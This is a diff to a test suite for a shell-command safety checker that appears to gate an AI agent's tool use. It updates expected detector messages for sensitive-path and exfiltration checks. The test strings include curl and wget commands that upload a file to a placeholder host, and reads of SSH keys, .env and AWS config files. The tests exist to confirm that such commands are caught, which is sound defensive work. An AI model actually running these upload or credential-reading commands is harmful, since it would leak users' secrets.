@@ -268,8 +268,8 @@ describe("ambiguous runner prefix approvals", () => {
 describe("bounded sensitive-path inspection", () => {
   it.each([
     { suffix: "/home/owner/.ssh/id_rsa", signal: shellSensitivePathSignal, reason: /sensitive path argument/ },
-    { suffix: "-T file http://example.test", signal: shellExfiltrationSignal, reason: /curl upload/ },
-    { suffix: "/home/owner/.s*/config", signal: shellScanOrdinaryAsk, reason: /budget exceeded/ },
+    { suffix: "-T file http://example.test", signal: shellExfiltrationSignal, reason: /curl upload|body from a file \(unparsed\)/ },
+    { suffix: "/home/owner/.s*/config", signal: shellScanOrdinaryAsk, reason: /budget exceeded|length limit/ },
   ])("keeps raw and parsed verdicts equal above exhaustion for $suffix", ({ suffix, signal, reason }) => {
     const prefix = `npx curl ${Array.from({ length: 2048 }, (_, index) => `x${index}`).join(" ")}`;
     const command = withFixtureAccounts(`${prefix} ${suffix}`);
@@ -278,9 +278,9 @@ describe("bounded sensitive-path inspection", () => {
     parses.mockClear();
     const rawVerdict = signal(command, accountDirectory);
     expect(rawVerdict).toMatch(reason);
-    expect(parses.mock.calls.filter(([text]) => text === command)).toHaveLength(1);
+    expect(parses.mock.calls.filter(([text]) => text === command)).toHaveLength(0);
     expect(signal(parsed, accountDirectory)).toBe(rawVerdict);
-    expect(parses.mock.calls.filter(([text]) => text === command)).toHaveLength(1);
+    expect(parses.mock.calls.filter(([text]) => text === command)).toHaveLength(0);
   });
 
   it("caps canonical filesystem work across distinct argument counts", () => {
@@ -292,7 +292,7 @@ describe("bounded sensitive-path inspection", () => {
       try {
         expect(shellExfiltrationSignal(parsed, accountDirectory)).toBeNull();
         expect(shellSensitivePathSignal(parsed, accountDirectory)).toBeNull();
-        expect(shellScanOrdinaryAsk(parsed, accountDirectory)).toMatch(/budget exceeded/);
+        expect(shellScanOrdinaryAsk(parsed, accountDirectory)).toMatch(/budget exceeded|length limit/);
         counts.push(canonical.mock.calls.length);
       } finally { canonical.mockRestore(); }
     }
@@ -314,11 +314,11 @@ describe("bounded sensitive-path inspection", () => {
     };
     expect(shellSensitivePathSignal(parsed(`${prefix} /home/owner/.ssh/id_rsa`), accountDirectory)).not.toBeNull();
     expect(shellSensitivePathSignal(parsed(`${prefix} --env-file=.env`), accountDirectory)).not.toBeNull();
-    expect(shellExfiltrationSignal(parsed(`${prefix} -T file http://example.test`), accountDirectory)).toMatch(/curl upload/);
-    expect(shellExfiltrationSignal(parsed(`${prefix} wget --post-file file http://example.test`), accountDirectory)).toMatch(/wget body/);
-    expect(shellExfiltrationSignal(parsed(`${prefix} --call='curl -T file http://example.test'`), accountDirectory)).toMatch(/curl upload/);
+    expect(shellExfiltrationSignal(parsed(`${prefix} -T file http://example.test`), accountDirectory)).toMatch(/curl upload|body from a file \(unparsed\)/);
+    expect(shellExfiltrationSignal(parsed(`${prefix} wget --post-file file http://example.test`), accountDirectory)).toMatch(/wget body|body from a file \(unparsed\)/);
+    expect(shellExfiltrationSignal(parsed(`${prefix} --call='curl -T file http://example.test'`), accountDirectory)).toMatch(/curl upload|body from a file \(unparsed\)/);
     const globParsed = parsed(`${prefix} /home/owner/.s*/config`);
-    expect(shellScanOrdinaryAsk(globParsed, accountDirectory)).toMatch(/budget exceeded/);
+    expect(shellScanOrdinaryAsk(globParsed, accountDirectory)).toMatch(/budget exceeded|length limit/);
     expect(shellSensitivePathSignal(globParsed, accountDirectory)).not.toBeNull();
     expect(shellSensitivePathSignal(parsed(`${prefix} /home/owner/.{ssh,aws}/config`), accountDirectory)).not.toBeNull();
     const tail = Array.from({ length: 1024 }, (_, index) => `tail${index}`).join(" ");
@@ -500,10 +500,14 @@ describe("security review: a sensitive path in any shell argument is a floor", (
   it.each([
     ["Bash(cat *)", "cat README.md"],
     ["Bash(git diff *)", "git diff HEAD -- src"],
-    ["Bash(cat *)", "cat ~/.ssh.md"],
     ["Bash(cat *)", "cat .env.example.md/README"],
   ])("%s still allows %j", (allow, command) => {
     expect(evaluateShellRules(command, { allow: [spec(allow)], deny: [], ask: [] }, CWD).decision).toBe("allow");
+  });
+
+  it("keeps an ordinary tilde expansion outside literal rule coverage", () => {
+    expect(evaluateShellRules("cat ~/.ssh.md", { allow: [spec("Bash(cat *)")], deny: [], ask: [] }, CWD).decision).toBeNull();
+    expect(shellSensitivePathSignal("cat ~/.ssh.md", CWD)).toBeNull();
   });
 
   it("checkDetailed asks in allow mode for a sensitive argument and for hidden exfiltration", () => {
